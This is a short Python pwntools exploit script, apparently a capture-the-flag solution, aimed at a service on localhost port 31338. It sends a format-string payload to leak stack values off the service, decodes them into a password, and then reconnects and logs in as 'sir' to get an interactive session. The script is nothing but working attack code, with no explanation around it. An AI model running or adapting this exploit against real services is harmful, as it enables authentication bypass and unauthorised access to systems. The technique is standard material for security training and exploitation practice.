from pwn import *

context(arch = 'i386', os = 'linux')

conn = remote('127.0.0.1',31338)
conn.recvuntil(": ")
conn.sendline(r"%11$x-%12$x")
conn.recvuntil(": ")
conn.sendline("asdf")
data = conn.recv()
password = data.split('\n')[1].split(' ')[0].split('-')
secret = password[0].decode('hex')[::-1] + password[1].decode('hex')[::-1]
print "Using password " + secret + " to login."
conn.close()
conn = remote('127.0.0.1',31338)
conn.recvuntil(": ")
conn.sendline("sir")
conn.recvuntil(": ")
conn.sendline(secret)
conn.interactive()

